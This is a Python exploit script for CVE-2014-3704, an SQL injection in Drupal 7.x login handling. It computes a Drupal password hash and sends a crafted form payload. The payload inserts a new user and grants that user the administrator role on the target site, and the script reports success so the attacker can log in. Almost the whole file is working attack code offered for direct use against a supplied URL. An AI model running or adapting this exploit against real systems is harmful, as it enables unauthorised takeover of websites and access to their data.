# CVE-2014-3704
# Drupal 7.x SQL exp

import urllib2,sys
import hashlib

#https://raw.githubusercontent.com/cvangysel/gitexd-drupalorg/master/drupalorg/drupalpass.py

class DrupalHash:

  def __init__(self, stored_hash, password):
    self.itoa64 = './0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
    self.last_hash = self.rehash(stored_hash, password)

  def get_hash(self):
    return self.last_hash

  def password_get_count_log2(self, setting):
    return self.itoa64.index(setting[3])

  def password_crypt(self, algo, password, setting):
    setting = setting[0:12]
    if setting[0] != '$' or setting[2] != '$':
      return False

    count_log2 = self.password_get_count_log2(setting)
    salt = setting[4:12]
    if len(salt) < 8:
      return False
    count = 1 << count_log2

    if algo == 'md5':
      hash_func = hashlib.md5
    elif algo == 'sha512':
      hash_func = hashlib.sha512
    else:
      return False
    hash_str = hash_func(salt + password).digest()
    for c in range(count):
      hash_str = hash_func(hash_str + password).digest()
    output = setting + self.custom64(hash_str)
    return output

  def custom64(self, string, count = 0):
    if count == 0:
      count = len(string)
    output = ''
    i = 0
    itoa64 = self.itoa64
    while 1:
      value = ord(string[i])
      i += 1
      output += itoa64[value & 0x3f]
      if i < count:
        value |= ord(string[i]) << 8
      output += itoa64[(value >> 6) & 0x3f]
      if i >= count:
        break
      i += 1
      if i < count:
        value |= ord(string[i]) << 16
      output += itoa64[(value >> 12) & 0x3f]
      if i >= count:
        break
      i += 1
      output += itoa64[(value >> 18) & 0x3f]
      if i >= count:
        break
    return output

  def rehash(self, stored_hash, password):
    # Drupal 6 compatibility
    if len(stored_hash) == 32 and stored_hash.find('$') == -1:
      return hashlib.md5(password).hexdigest()
      # Drupal 7
    if stored_hash[0:2] == 'U$':
      stored_hash = stored_hash[1:]
      password = hashlib.md5(password).hexdigest()
    hash_type = stored_hash[0:3]
    if hash_type == '$S$':
      hash_str = self.password_crypt('sha512', password, stored_hash)
    elif hash_type == '$H$' or hash_type == '$P$':
      hash_str = self.password_crypt('md5', password, stored_hash)
    else:
      hash_str = False
    return hash_str

if len(sys.argv) != 4:
    print ""
    print "python 7.xSQL.py  [url]http://xxoo.com/drupal[/url] admin 123456"
    print ""
    sys.exit(1)
host = sys.argv[1]
user = sys.argv[2]
password = sys.argv[3]
hash = DrupalHash("$S$CTo9G7Lx28rzCfpn4WB2hUlknDKv6QTqHaf82WLbhPT2K5TzKzML", password).get_hash()
target = '%s/?q=node&destination=node' % host
insert_user = "name[0%20;set+@a%3d%28SELECT+MAX%28uid%29+FROM+users%29%2b1;INSERT+INTO+users+set+uid%3d@a,status%3d1,name%3d\'" \
            +user \
            +"'+,+pass+%3d+'" \
            +hash[:55] \
            +"';INSERT+INTO+users_roles+set+uid%3d@a,rid%3d3;;#%20%20]=bob&name[0]=larry&pass=lol&form_build_id=&form_id=user_login_block&op=Log+in"
print insert_user
content = urllib2.urlopen(url=target, data=insert_user).read()
if "mb_strlen() expects parameter 1" in content:
        print "Success!\nLogin now with user:%s and pass:%s" % (user, password)

